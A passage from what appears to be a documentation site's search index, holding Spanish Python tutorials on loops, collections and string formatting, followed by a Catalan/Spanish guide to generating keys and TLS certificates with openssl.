c vale 2 c vale 5 c vale 6 Se ha completado toda la iteraci\u00f3n y c vale 6","title":"Instrucci\u00f3n Continue"},{"location":"lenguajes/python3/fundamentos/fundamento/#menu-interactivo","text":"print ( \"Bienvenido al men\u00fa interactivo\" ) while ( True ): print ( \"\"\"\u00bfQu\u00e9 quieres hacer? Escribe una opci\u00f3n 1) Saludar 2) Sumar dos n\u00fameros 3) Salir\"\"\" ) opcion = input () if opcion == '1' : print ( \"Hola, espero que te lo est\u00e9s pasando bien\" ) elif opcion == '2' : n1 = float ( input ( \"Introduce el primer n\u00famero: \" )) n2 = float ( input ( \"Introduce el segundo n\u00famero: \" )) print ( \"El resultado de la suma es: \" , n1 + n2 ) elif opcion == '3' : print ( \"\u00a1Hasta luego! Ha sido un placer ayudarte\" ) break else : print ( \"Comando desconocido, vuelve a intentarlo\" )","title":"men\u00fa interactivo"},{"location":"lenguajes/python3/fundamentos/fundamento/#for","text":"for numero in numeros : # Para [variable] en [lista] print ( numero ) 1 2 3 4","title":"For"},{"location":"lenguajes/python3/fundamentos/fundamento/#modificar-items-de-lista","text":"La forma correcta de hacerlo es haciendo referencia al \u00edndice de la lista en lugar de la variable: indice = 0 numeros = [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 ] for numero in numeros : numeros [ indice ] *= 10 indice += 1 print ( numeros ) [10, 20, 30, 40, 50, 60, 70, 80, 90, 100] Podemos utilizar la funci\u00f3n enumerate() para conseguir el \u00edndice y el valor en cada iteraci\u00f3n f\u00e1cilmente: numeros = [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9 , 10 ] for indice , numero in enumerate ( numeros ): numeros [ indice ] *= 10 numeros [10, 20, 30, 40, 50, 60, 70, 80, 90, 100]","title":"Modificar \u00edtems de lista"},{"location":"lenguajes/python3/fundamentos/fundamento/#la-funcion-range","text":"Sirve para generar una lista de n\u00fameros que podemos recorrer f\u00e1cilmente, pero no ocupa memoria porque se interpreta sobre la marcha: for i in range ( 10 ): print ( i ) 0 1 2 3 4 5 6 7 8 9 Si queremos conseguir la lista literal podemos transformar el range a una lista: print ( list ( range ( 10 )) ) [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] Si queremos conseguir la suma de todos los numeros pares del 0 al 100 suma = sum ( range ( 0 , 101 , 2 ) ) print ( suma ) 2550","title":"La funci\u00f3n range()"},{"location":"lenguajes/python3/fundamentos/manejo_de_datos/","text":"Manejo de datos Los conjuntos Son colecciones desordenadas de elementos \u00fanicos utilizados para hacer pruebas de pertenencia a grupos y eliminaci\u00f3n de elementos duplicados. conjunto = set () conjunto = { 1 , 2 , 3 } print ( conjunto ) {1, 2, 3} Un conjunto auto-elimina elementos duplicados test = { 'Hector' , 'Hector' , 'Hector' } print ( test ) {'Hector'} M\u00e9todo add() Sirve para a\u00f1adir elementos al conjunto. Si un elemento ya se encuentra, no se a\u00f1adir\u00e1 de nuevo. conjunto = set () conjunto = { 1 , 2 , 3 } conjunto . add ( 4 ) print ( conjunto ) {1, 2, 3, 4} conjunto . add ( 0 ) print ( conjunto ) {0, 1, 2, 3, 4} lista a conjunto y viceversa Es muy \u00fatil transformar listas a conjuntos para borrar los elementos duplicados autom\u00e1ticamente. l = [ 1 , 2 , 3 , 3 , 2 , 1 ] print ( l ) [1, 2, 3, 3, 2, 1] Convertir lista a conjunto c = set ( l ) print ( c ) {1, 2, 3} Convertir conjunto a lista l = list ( c ) print ( l ) [1, 2, 3] Conversion en una linea, lista --> conjunto --> lista l = [ 1 , 2 , 3 , 3 , 2 , 1 ] # En una l\u00ednea l = list ( set ( l ) ) print ( l ) [1, 2, 3] cadena a conjunto Sirve para crear un conjunto con todos los caracteres de la cadena. s = \"Al pan pan y al vino vino\" print ( set ( s ) ) {' ', 'A', 'a', 'i', 'l', 'n', 'o', 'p', 'v', 'y'} Los diccionarios Son junto a las listas las colecciones m\u00e1s utilizadas. Se basan en una estructura mapeada donde cada elemento de la colecci\u00f3n se encuentra identificado con una clave \u00fanica. Por tanto, no puede haber dos claves iguales. En otros lenguajes se conocen como arreglos asociativos. vacio = {} print ( vacio ) {} Tipo de variable type ( vacio ) dict Sintaxis Para cada elemento se define la estructura -> clave:valor colores = { 'amarillo' : 'yellow' , 'azul' : 'blue' } Tambi\u00e9n se pueden a\u00f1adir elementos sobre la marcha colores [ 'verde' ] = 'green' print ( colores ) {'amarillo': 'yellow', 'azul': 'blue', 'verde': 'green'} print ( colores [ 'azul' ]) 'blue' Modificaci\u00f3n de valor a partir de la clave colores [ 'amarillo' ] = 'white' print ( colores ) {'amarillo': 'white', 'azul': 'blue', 'verde': 'green'} Funci\u00f3n del() Sirve para borrar un elemento del diccionario. del ( colores [ 'amarillo' ]) print ( colores ) {'azul': 'blue', 'verde': 'green'} Directamente con registros edades = { 'Hector' : 27 , 'Juan' : 45 , 'Maria' : 34 } edades [ 'Hector' ] += 1 print ( edades ) {'Hector': 28, 'Juan': 45, 'Maria': 34} Lectura secuencial con for Es posible utilizar una iteraci\u00f3n for para recorrer los elementos del diccionario: for edad in edades : print ( edad ) Maria Hector Juan El problema es que se devuelven las claves, no los valores Para solucionarlo deber\u00edamos indicar la clave del diccionario para cada elemento. for clave in edades : print ( clave , edades [ clave ]) Maria 34 Hector 28 Juan 45 El m\u00e9todo .items() Nos facilita la lectura en clave y valor de los elementos porque devuelve ambos valores en cada iteraci\u00f3n autom\u00e1ticamente: for c , v in edades . items (): print ( c , v ) Maria 34 Hector 28 Juan 45 listas de disccionarios Podemos crear nuestras propias estructuras avanzadas mezclando ambas colecciones. Mientras los diccionarios se encargar\u00edan de manejar las propiedades individuales de los registros, las listas nos permitir\u00edan manejarlos todos en conjunto. personajes = [] p = { 'Nombre' : 'Gandalf' , 'Clase' : 'Mago' , 'Raza' : 'Humano' } personajes . append ( p ) print ( personajes ) [{'Clase': 'Mago', 'Nombre': 'Gandalf', 'Raza': 'Humano'}] p = { 'Nombre' : 'Legolas' , 'Clase' : 'Arquero' , 'Raza' : 'Elfo' } personajes . append ( p ) p = { 'Nombre' : 'Gimli' , 'Clase' : 'Guerrero' , 'Raza' : 'Enano' } personajes . append ( p ) print ( personajes ) [{'Clase': 'Mago', 'Nombre': 'Gandalf', 'Raza': 'Humano'}, {'Clase': 'Arquero', 'Nombre': 'Legolas', 'Raza': 'Elfo'}, {'Clase': 'Guerrero', 'Nombre': 'Gimli', 'Raza': 'Enano'}] for p in personajes : print ( p [ 'Nombre' ], p [ 'Clase' ], p [ 'Raza' ]) Gandalf Mago Humano Legolas Arquero Elfo Gimli Guerrero Enano Valor por defecto Se utilizan para crear diccionarios con un valor por defecto aunque el registro no haya sido definido anteriormente. d = {} d [ 'algo' ] --------------------------------------------------------------------------- KeyError Traceback (most recent call last) <ipython-input-38-c4e2998bb821> in <module>() ----> 1 d['algo'] KeyError: 'algo' from collections import defaultdict d = defaultdict ( float ) d [ 'algo' ] 0.0 d defaultdict(float, {'algo': 0.0}) d = defaultdict ( str ) d [ 'algo' ] '' d defaultdict(str, {'algo': ''}) d = defaultdict ( object ) d [ 'algo' ] <object at 0x1ad7f3201f0> d defaultdict(object, {'algo': <object at 0x1ad7f3201f0>}) d = defaultdict ( int ) d [ 'algo' ] = 10.5 d [ 'algo' ] 10.5 d [ 'algomas' ] 0 d defaultdict(int, {'algo': 10.5, 'algomas': 0}) n = {} n [ 'uno' ] = 'one' n [ 'dos' ] = 'two' n [ 'tres' ] = 'three' n {'dos': 'two', 'tres': 'three', 'uno': 'one'} Diccionarios ordenados Otra subclase de diccionario que conserva el orden en que a\u00f1adimos los registros. from collections import OrderedDict n = OrderedDict () n [ 'uno' ] = 'one' n [ 'dos' ] = 'two' n [ 'tres' ] = 'three' n OrderedDict([('uno', 'one'), ('dos', 'two'), ('tres', 'three')]) n1 = {} n1 [ 'uno' ] = 'one' n1 [ 'dos' ] = 'two' n2 = {} n2 [ 'dos' ] = 'two' n2 [ 'uno' ] = 'one' n1 == n2 True n1 = OrderedDict () n1 [ 'uno' ] = 'one' n1 [ 'dos' ] = 'two' n2 = OrderedDict () n2 [ 'dos' ] = 'two' n2 [ 'uno' ] = 'one' n1 == n2 False Las pilas Son colecciones de elementos ordenados que \u00fanicamente permiten dos acciones: A\u00f1adir un elemento a la pila Sacar un elemento de la pila La peculiaridad es que el \u00faltimo elemento en entrar es el primero en salir. En ingl\u00e9s se conocen como estructuras LIFO (Last In First Out) . Las podemos crear como listas normales y a\u00f1adir elementos al final con el append(): pila = [ 3 , 4 , 5 ] pila . append ( 6 ) pila . append ( 7 ) print ( pila ) [3, 4, 5, 6, 7] Para sacar los elementos utilizaremos el m\u00e9todo .pop(): Al utilizar pop() devolveremos el \u00faltimo elemento, pero tambi\u00e9n lo borraremos. Si queremos trabajar con \u00e9l deber\u00edamos asignarlo a una variable o lo perderemos: pila . pop () 7 print ( pila ) [3, 4, 5, 6] Si hacemos pop() de una pila vac\u00eda, devolver\u00e1 un error: Debemos asegurarnos siempre de que la len() de la pila sea mayor que 0 antes de extraer un elemento autom\u00e1ticamente. pila . pop () --------------------------------------------------------------------------- IndexError Traceback (most recent call last) <ipython-input-14-3900970cfbef> in <module>() ----> 1 pila.pop() IndexError: pop from empty list Las colas Son colecciones de elementos ordenados que \u00fanicamente permiten dos acciones: A\u00f1adir un elemento a la cola Sacar un elemento de la cola La peculiaridad es que el primer elemento en entrar es el primero en salir. En ingl\u00e9s se conocen como estructuras FIFO (First In First Out) . Debemos importar la colecci\u00f3n deque manualmente para crear una cola: from collections import deque cola = deque () print ( cola ) deque([]) Podemos a\u00f1adir elemento directamente pasando una lista a la cola al crearla: cola = deque ([ 'Hector' , 'Juan' , 'Miguel' ]) print ( cola ) deque(['Hector', 'Juan', 'Miguel']) Y tambi\u00e9n utilizando el m\u00e9todo .append() : cola . append ( 'Maria' ) cola . append ( 'Arnaldo' ) print ( cola ) deque(['Hector', 'Juan', 'Miguel', 'Maria', 'Arnaldo']) A la hora de sacar los elementos utilizaremos el m\u00e9todo popleft() para extraerlos por la parte izquierda (el principio de la cola). cola . popleft () 'Hector' print ( cola ) deque(['Juan', 'Miguel', 'Maria', 'Arnaldo']) cola . popleft () 'Juan' print ( cola ) deque(['Miguel', 'Maria', 'Arnaldo'])","title":"Manejo de datos"},{"location":"lenguajes/python3/fundamentos/manejo_de_datos/#manejo-de-datos","text":"","title":"Manejo de datos"},{"location":"lenguajes/python3/fundamentos/manejo_de_datos/#los-conjuntos","text":"Son colecciones desordenadas de elementos \u00fanicos utilizados para hacer pruebas de pertenencia a grupos y eliminaci\u00f3n de elementos duplicados. conjunto = set () conjunto = { 1 , 2 , 3 } print ( conjunto ) {1, 2, 3} Un conjunto auto-elimina elementos duplicados test = { 'Hector' , 'Hector' , 'Hector' } print ( test ) {'Hector'}","title":"Los conjuntos"},{"location":"lenguajes/python3/fundamentos/manejo_de_datos/#metodo-add","text":"Sirve para a\u00f1adir elementos al conjunto. Si un elemento ya se encuentra, no se a\u00f1adir\u00e1 de nuevo. conjunto = set () conjunto = { 1 , 2 , 3 } conjunto . add ( 4 ) print ( conjunto ) {1, 2, 3, 4} conjunto . add ( 0 ) print ( conjunto ) {0, 1, 2, 3, 4}","title":"M\u00e9todo add()"},{"location":"lenguajes/python3/fundamentos/manejo_de_datos/#lista-a-conjunto-y-viceversa","text":"Es muy \u00fatil transformar listas a conjuntos para borrar los elementos duplicados autom\u00e1ticamente. l = [ 1 , 2 , 3 , 3 , 2 , 1 ] print ( l ) [1, 2, 3, 3, 2, 1] Convertir lista a conjunto c = set ( l ) print ( c ) {1, 2, 3} Convertir conjunto a lista l = list ( c ) print ( l ) [1, 2, 3] Conversion en una linea, lista --> conjunto --> lista l = [ 1 , 2 , 3 , 3 , 2 , 1 ] # En una l\u00ednea l = list ( set ( l ) ) print ( l ) [1, 2, 3]","title":"lista a conjunto y viceversa"},{"location":"lenguajes/python3/fundamentos/manejo_de_datos/#cadena-a-conjunto","text":"Sirve para crear un conjunto con todos los caracteres de la cadena. s = \"Al pan pan y al vino vino\" print ( set ( s ) ) {' ', 'A', 'a', 'i', 'l', 'n', 'o', 'p', 'v', 'y'}","title":"cadena a conjunto"},{"location":"lenguajes/python3/fundamentos/manejo_de_datos/#los-diccionarios","text":"Son junto a las listas las colecciones m\u00e1s utilizadas. Se basan en una estructura mapeada donde cada elemento de la colecci\u00f3n se encuentra identificado con una clave \u00fanica. Por tanto, no puede haber dos claves iguales. En otros lenguajes se conocen como arreglos asociativos. vacio = {} print ( vacio ) {} Tipo de variable type ( vacio ) dict","title":"Los diccionarios"},{"location":"lenguajes/python3/fundamentos/manejo_de_datos/#sintaxis","text":"Para cada elemento se define la estructura -> clave:valor colores = { 'amarillo' : 'yellow' , 'azul' : 'blue' } Tambi\u00e9n se pueden a\u00f1adir elementos sobre la marcha colores [ 'verde' ] = 'green' print ( colores ) {'amarillo': 'yellow', 'azul': 'blue', 'verde': 'green'} print ( colores [ 'azul' ]) 'blue'","title":"Sintaxis"},{"location":"lenguajes/python3/fundamentos/manejo_de_datos/#modificacion-de-valor-a-partir-de-la-clave","text":"colores [ 'amarillo' ] = 'white' print ( colores ) {'amarillo': 'white', 'azul': 'blue', 'verde': 'green'}","title":"Modificaci\u00f3n de valor a partir de la clave"},{"location":"lenguajes/python3/fundamentos/manejo_de_datos/#funcion-del","text":"Sirve para borrar un elemento del diccionario. del ( colores [ 'amarillo' ]) print ( colores ) {'azul': 'blue', 'verde': 'green'}","title":"Funci\u00f3n del()"},{"location":"lenguajes/python3/fundamentos/manejo_de_datos/#directamente-con-registros","text":"edades = { 'Hector' : 27 , 'Juan' : 45 , 'Maria' : 34 } edades [ 'Hector' ] += 1 print ( edades ) {'Hector': 28, 'Juan': 45, 'Maria': 34}","title":"Directamente con registros"},{"location":"lenguajes/python3/fundamentos/manejo_de_datos/#lectura-secuencial-con-for","text":"Es posible utilizar una iteraci\u00f3n for para recorrer los elementos del diccionario: for edad in edades : print ( edad ) Maria Hector Juan El problema es que se devuelven las claves, no los valores Para solucionarlo deber\u00edamos indicar la clave del diccionario para cada elemento. for clave in edades : print ( clave , edades [ clave ]) Maria 34 Hector 28 Juan 45","title":"Lectura secuencial con for"},{"location":"lenguajes/python3/fundamentos/manejo_de_datos/#el-metodo-items","text":"Nos facilita la lectura en clave y valor de los elementos porque devuelve ambos valores en cada iteraci\u00f3n autom\u00e1ticamente: for c , v in edades . items (): print ( c , v ) Maria 34 Hector 28 Juan 45","title":"El m\u00e9todo .items()"},{"location":"lenguajes/python3/fundamentos/manejo_de_datos/#listas-de-disccionarios","text":"Podemos crear nuestras propias estructuras avanzadas mezclando ambas colecciones. Mientras los diccionarios se encargar\u00edan de manejar las propiedades individuales de los registros, las listas nos permitir\u00edan manejarlos todos en conjunto. personajes = [] p = { 'Nombre' : 'Gandalf' , 'Clase' : 'Mago' , 'Raza' : 'Humano' } personajes . append ( p ) print ( personajes ) [{'Clase': 'Mago', 'Nombre': 'Gandalf', 'Raza': 'Humano'}] p = { 'Nombre' : 'Legolas' , 'Clase' : 'Arquero' , 'Raza' : 'Elfo' } personajes . append ( p ) p = { 'Nombre' : 'Gimli' , 'Clase' : 'Guerrero' , 'Raza' : 'Enano' } personajes . append ( p ) print ( personajes ) [{'Clase': 'Mago', 'Nombre': 'Gandalf', 'Raza': 'Humano'}, {'Clase': 'Arquero', 'Nombre': 'Legolas', 'Raza': 'Elfo'}, {'Clase': 'Guerrero', 'Nombre': 'Gimli', 'Raza': 'Enano'}] for p in personajes : print ( p [ 'Nombre' ], p [ 'Clase' ], p [ 'Raza' ]) Gandalf Mago Humano Legolas Arquero Elfo Gimli Guerrero Enano","title":"listas de disccionarios"},{"location":"lenguajes/python3/fundamentos/manejo_de_datos/#valor-por-defecto","text":"Se utilizan para crear diccionarios con un valor por defecto aunque el registro no haya sido definido anteriormente. d = {} d [ 'algo' ] --------------------------------------------------------------------------- KeyError Traceback (most recent call last) <ipython-input-38-c4e2998bb821> in <module>() ----> 1 d['algo'] KeyError: 'algo' from collections import defaultdict d = defaultdict ( float ) d [ 'algo' ] 0.0 d defaultdict(float, {'algo': 0.0}) d = defaultdict ( str ) d [ 'algo' ] '' d defaultdict(str, {'algo': ''}) d = defaultdict ( object ) d [ 'algo' ] <object at 0x1ad7f3201f0> d defaultdict(object, {'algo': <object at 0x1ad7f3201f0>}) d = defaultdict ( int ) d [ 'algo' ] = 10.5 d [ 'algo' ] 10.5 d [ 'algomas' ] 0 d defaultdict(int, {'algo': 10.5, 'algomas': 0}) n = {} n [ 'uno' ] = 'one' n [ 'dos' ] = 'two' n [ 'tres' ] = 'three' n {'dos': 'two', 'tres': 'three', 'uno': 'one'}","title":"Valor por defecto"},{"location":"lenguajes/python3/fundamentos/manejo_de_datos/#diccionarios-ordenados","text":"Otra subclase de diccionario que conserva el orden en que a\u00f1adimos los registros. from collections import OrderedDict n = OrderedDict () n [ 'uno' ] = 'one' n [ 'dos' ] = 'two' n [ 'tres' ] = 'three' n OrderedDict([('uno', 'one'), ('dos', 'two'), ('tres', 'three')]) n1 = {} n1 [ 'uno' ] = 'one' n1 [ 'dos' ] = 'two' n2 = {} n2 [ 'dos' ] = 'two' n2 [ 'uno' ] = 'one' n1 == n2 True n1 = OrderedDict () n1 [ 'uno' ] = 'one' n1 [ 'dos' ] = 'two' n2 = OrderedDict () n2 [ 'dos' ] = 'two' n2 [ 'uno' ] = 'one' n1 == n2 False","title":"Diccionarios ordenados"},{"location":"lenguajes/python3/fundamentos/manejo_de_datos/#las-pilas","text":"Son colecciones de elementos ordenados que \u00fanicamente permiten dos acciones: A\u00f1adir un elemento a la pila Sacar un elemento de la pila La peculiaridad es que el \u00faltimo elemento en entrar es el primero en salir. En ingl\u00e9s se conocen como estructuras LIFO (Last In First Out) . Las podemos crear como listas normales y a\u00f1adir elementos al final con el append(): pila = [ 3 , 4 , 5 ] pila . append ( 6 ) pila . append ( 7 ) print ( pila ) [3, 4, 5, 6, 7] Para sacar los elementos utilizaremos el m\u00e9todo .pop(): Al utilizar pop() devolveremos el \u00faltimo elemento, pero tambi\u00e9n lo borraremos. Si queremos trabajar con \u00e9l deber\u00edamos asignarlo a una variable o lo perderemos: pila . pop () 7 print ( pila ) [3, 4, 5, 6] Si hacemos pop() de una pila vac\u00eda, devolver\u00e1 un error: Debemos asegurarnos siempre de que la len() de la pila sea mayor que 0 antes de extraer un elemento autom\u00e1ticamente. pila . pop () --------------------------------------------------------------------------- IndexError Traceback (most recent call last) <ipython-input-14-3900970cfbef> in <module>() ----> 1 pila.pop() IndexError: pop from empty list","title":"Las pilas"},{"location":"lenguajes/python3/fundamentos/manejo_de_datos/#las-colas","text":"Son colecciones de elementos ordenados que \u00fanicamente permiten dos acciones: A\u00f1adir un elemento a la cola Sacar un elemento de la cola La peculiaridad es que el primer elemento en entrar es el primero en salir. En ingl\u00e9s se conocen como estructuras FIFO (First In First Out) . Debemos importar la colecci\u00f3n deque manualmente para crear una cola: from collections import deque cola = deque () print ( cola ) deque([]) Podemos a\u00f1adir elemento directamente pasando una lista a la cola al crearla: cola = deque ([ 'Hector' , 'Juan' , 'Miguel' ]) print ( cola ) deque(['Hector', 'Juan', 'Miguel']) Y tambi\u00e9n utilizando el m\u00e9todo .append() : cola . append ( 'Maria' ) cola . append ( 'Arnaldo' ) print ( cola ) deque(['Hector', 'Juan', 'Miguel', 'Maria', 'Arnaldo']) A la hora de sacar los elementos utilizaremos el m\u00e9todo popleft() para extraerlos por la parte izquierda (el principio de la cola). cola . popleft () 'Hector' print ( cola ) deque(['Juan', 'Miguel', 'Maria', 'Arnaldo']) cola . popleft () 'Juan' print ( cola ) deque(['Miguel', 'Maria', 'Arnaldo'])","title":"Las colas"},{"location":"lenguajes/python3/fundamentos/salida_por_pantalla/","text":"Salida por pantalla La funci\u00f3n print() es la forma general de mostrar informaci\u00f3n por pantalla. Generalmente podemos mostrar texto y variables separ\u00e1ndolos con comas: v = \"otro texto\" n = 10 print ( \"Un texto\" , v , \"y un n\u00famero\" , n ) Un texto otro texto y un n\u00famero 10 El m\u00e9todo .format() Es una funcionalidad de las cadenas de texto que nos permite formatear informaci\u00f3n en una cadena (variables o valores literales) c\u00f3modamente utilizando identificadores referenciados: c = \"Un texto ' {} ' y un n\u00famero ' {} '\" . format ( v , n ) print ( c ) \"Un texto 'otro texto' y un n\u00famero '10'\" Tambi\u00e9n podemos referenciar a partir de la posici\u00f3n de los valores utilizando \u00edndices: print ( \"Un texto ' {1} ' y un n\u00famero ' {0} '\" . format ( v , n ) ) Un texto '10' y un n\u00famero 'otro texto' O podemos utilizar identificador con una clave y luego pasarlas en el format: print ( \"Un texto ' {v} ' y un n\u00famero ' {n} '\" . format ( n = n , v = v ) ) Un texto 'otro texto' y un n\u00famero '10' print ( \" {v} , {v} , {v} \" . format ( v = v )) otro texto,otro texto,otro texto Formateo avanzado Alineamiento a la derecha en 30 caracteres print ( \" {:>30} \" . format ( \"palabra\" ) ) palabra Alineamiento a la izquierda en 30 caracteres print ( \" {:30} \" . format ( \"palabra\" ) ) palabra Alineamiento al centro en 30 caracteres print ( \" {:^30} \" . format ( \"palabra\" ) ) palabra Truncamiento a 3 caracteres print ( \" {:.5} \" . format ( \"palabra\" ) ) palab Alineamiento a la derecha en 30 caracteres con truncamiento de 3 print ( \" {:>30.3} \" . format ( \"palabra\" ) ) pal Formateo de n\u00fameros enteros, rellenados con espacios print ( \" {:4d} \" . format ( 10 )) print ( \" {:4d} \" . format ( 100 )) print ( \" {:4d} \" . format ( 1000 )) 10 100 1000 Formateo de n\u00fameros enteros, rellenados con ceros print ( \" {:04d} \" . format ( 10 )) print ( \" {:04d} \" . format ( 100 )) print ( \" {:04d} \" . format ( 1000 )) 0010 0100 1000 Formateo de n\u00fameros flotantes, rellenados con espacios print ( \" {:7.3f} \" . format ( 3.1415926 )) print ( \" {:7.3f} \" . format ( 153.21 )) 3.142 153.210 Formateo de n\u00fameros flotantes, rellenados con ceros print ( \" {:07.3f} \" . format ( 3.1415926 )) print ( \" {:07.3f} \" . format ( 153.21 )) 003.142 153.210","title":"Salida por pantalla"},{"location":"lenguajes/python3/fundamentos/salida_por_pantalla/#salida-por-pantalla","text":"La funci\u00f3n print() es la forma general de mostrar informaci\u00f3n por pantalla. Generalmente podemos mostrar texto y variables separ\u00e1ndolos con comas: v = \"otro texto\" n = 10 print ( \"Un texto\" , v , \"y un n\u00famero\" , n ) Un texto otro texto y un n\u00famero 10","title":"Salida por pantalla"},{"location":"lenguajes/python3/fundamentos/salida_por_pantalla/#el-metodo-format","text":"Es una funcionalidad de las cadenas de texto que nos permite formatear informaci\u00f3n en una cadena (variables o valores literales) c\u00f3modamente utilizando identificadores referenciados: c = \"Un texto ' {} ' y un n\u00famero ' {} '\" . format ( v , n ) print ( c ) \"Un texto 'otro texto' y un n\u00famero '10'\" Tambi\u00e9n podemos referenciar a partir de la posici\u00f3n de los valores utilizando \u00edndices: print ( \"Un texto ' {1} ' y un n\u00famero ' {0} '\" . format ( v , n ) ) Un texto '10' y un n\u00famero 'otro texto' O podemos utilizar identificador con una clave y luego pasarlas en el format: print ( \"Un texto ' {v} ' y un n\u00famero ' {n} '\" . format ( n = n , v = v ) ) Un texto 'otro texto' y un n\u00famero '10' print ( \" {v} , {v} , {v} \" . format ( v = v )) otro texto,otro texto,otro texto","title":"El m\u00e9todo .format()"},{"location":"lenguajes/python3/fundamentos/salida_por_pantalla/#formateo-avanzado","text":"Alineamiento a la derecha en 30 caracteres print ( \" {:>30} \" . format ( \"palabra\" ) ) palabra Alineamiento a la izquierda en 30 caracteres print ( \" {:30} \" . format ( \"palabra\" ) ) palabra Alineamiento al centro en 30 caracteres print ( \" {:^30} \" . format ( \"palabra\" ) ) palabra Truncamiento a 3 caracteres print ( \" {:.5} \" . format ( \"palabra\" ) ) palab Alineamiento a la derecha en 30 caracteres con truncamiento de 3 print ( \" {:>30.3} \" . format ( \"palabra\" ) ) pal Formateo de n\u00fameros enteros, rellenados con espacios print ( \" {:4d} \" . format ( 10 )) print ( \" {:4d} \" . format ( 100 )) print ( \" {:4d} \" . format ( 1000 )) 10 100 1000 Formateo de n\u00fameros enteros, rellenados con ceros print ( \" {:04d} \" . format ( 10 )) print ( \" {:04d} \" . format ( 100 )) print ( \" {:04d} \" . format ( 1000 )) 0010 0100 1000 Formateo de n\u00fameros flotantes, rellenados con espacios print ( \" {:7.3f} \" . format ( 3.1415926 )) print ( \" {:7.3f} \" . format ( 153.21 )) 3.142 153.210 Formateo de n\u00fameros flotantes, rellenados con ceros print ( \" {:07.3f} \" . format ( 3.1415926 )) print ( \" {:07.3f} \" . format ( 153.21 )) 003.142 153.210","title":"Formateo avanzado"},{"location":"seguridad/Certificados-Digitales/","text":"Certificados Digitales TLS/SSL (HTTPS) Generaci\u00f3 de claus, requests i certs Certificado autofirmado openssl req -new -x509 -days 3650 -nodes -keyout serverkey.auto1.pem -out servercert.auto1.pem Creaci\u00f3n de clave privada y certificado autofirmado openssl genrsa -out serverkey.auto2.pem openssl req -new -x509 -days 3650 -nodes -key serverkey.auto2.pem -out servercert.auto2.pem Creaci\u00f3n de clave privada, request i certificaci\u00f3n openssl genrsa -out serverkey.web1.pem openssl req -new -key serverkey.web1.pem -out serverreq.web1.pem openssl x509 -CAkey cakey.pem -CA cacert.pem -req -in serverreq.web1.pem -days 3650 -CAcreateserial -out servercert.web1.pem Creaci\u00f3n de clave provada Petici\u00f3n de certificaci\u00f3n y firma de la certificaci\u00f3n usando fitchero de configuraci\u00f3n Fitxer exemple de configuraci\u00f3 parcial de openssl: #ca.conf basicConstraints = critical,CA:FALSE extendedKeyUsage = serverAuth,emailProtection openssl genrsa -out serverkey.web2.pem openssl req -new -key serverkey.web2.pem -out serverreq.web2.pem openssl x509 -CAkey cakey.pem -CA cacert.pem -req -in serverreq.web2.pem -days 3650 -CAcreateserial -extfile ca.conf -out servercert.web2.pem Request sin interactivo # Generar el certificat + clau privada autosignats openssl req -x509 -nodes -days 365 -sha256 \\ -subj '/C=ca/ST=Barcelona/L=Barcelona/CN=www.edt.org' \\ -newkey rsa:2048 -keyout mykey.pem -out mycert.pem \u279c openssl req -new -x509 -nodes -out mycrt.pem -keyout mykey.pem Generating a RSA private key ....................................+++++ .........+++++ writing new private key to 'mykey.pem' ----- You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :barcelona Locality Name ( eg, city ) [] :Barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :escola del treball Organizational Unit Name ( eg, section ) [] :departament informatica Common Name ( e.g. server FQDN or YOUR name ) [] :www.edt.org Email Address [] :admin@edt.org Crear una CA propia # generar clave privada encriptada con des3 i passfrase (formato PEM) \u279c openssl genrsa -des3 -out ca.key 2048 # generar el certificat x509 pr\u00f2pi de l'entitat CA (per a 365 dies) en format PEM \u279c openssl req -new -x509 -nodes -sha1 -days 365 -key ca.key -out ca.crt Enter pass phrase for ca.key: You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) [ Some-State ] :Barcelona Locality Name ( eg, city ) [] :Barcelona Organization Name ( eg, company ) [ Internet Widgits Pty Ltd ] :Veritat absoluta Organizational Unit Name ( eg, section ) [] :Departament de certificats Common Name ( e.g. server FQDN or YOUR name ) [] :VeritatAbsoluta Email Address [] :admin@edt.org \u279c ll -rw-r--r-- 1 debian debian 1 ,5K mar 30 11 :24 ca.crt -rw------- 1 debian debian 1 ,8K mar 30 11 :17 ca.key Contenido f\u00edsico y l\u00f3gico # contenido fisico \u279c cat ca.key -----BEGIN RSA PRIVATE KEY----- Proc-Type: 4 ,ENCRYPTED DEK-Info: DES-EDE3-CBC,7EB452B3EA57B216 gtG861azfOG/vZblyVumXLzx9SvFAT3shENQQxNqjW+PMUO9+aB15oNwASSgj1X2 SGRTEZtViAZdo1B5K8N3nhArTWULsIpHP5EiiS1qDYaFQcU38+Akzw == -----END RSA PRIVATE KEY----- # contenido logico \u279c openssl rsa -noout -text -in ca.key Enter pass phrase for ca.key: RSA Private-Key: ( 2048 bit, 2 primes ) modulus: 00 :c8:72:8a:93:51:19:0a:58:d6:45:8f:2e:1b:24: cd:e9:0d:5a:91:69:2f:e9:49:fb:56:78:68:9e:94: ... # ca.crt \u279c openssl x509 -noout -text -in ca.crt Certificate: Data: Version: 3 ( 0x2 ) Serial Number: 56 :b0:8d:ea:f1:e0:ea:b6:ca:ca:36:b1:56:35:54:9b:32:e1:87:11 Signature Algorithm: sha1WithRSAEncryption Issuer: C = ca, ST = Barcelona, L = Barcelona, O = Veritat absoluta, OU = Departament de certificats, CN = VeritatAbsoluta, emailAddress = admin@edt.org Validity Not Before: Mar 30 09 :24:14 2020 GMT Not After : Mar 30 09 :24:14 2021 GMT crear certificado servidor real # Crear una clau privada per al servidor # \u00e9s en format PEM, de 2048 bits i xifrada en 3DES. Utilitza passfrase \u279c openssl genrsa -des3 -out server.key 2048 # Generar una petici\u00f3 de certificat request per enviar a l'entitat certificadora CA \u279c openssl req -new -key server.key -out server.csr Enter pass phrase for server.key: You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter '.' , the field will be left blank. ----- Country Name ( 2 letter code ) [ AU ] :ca State or Province Name ( full name ) 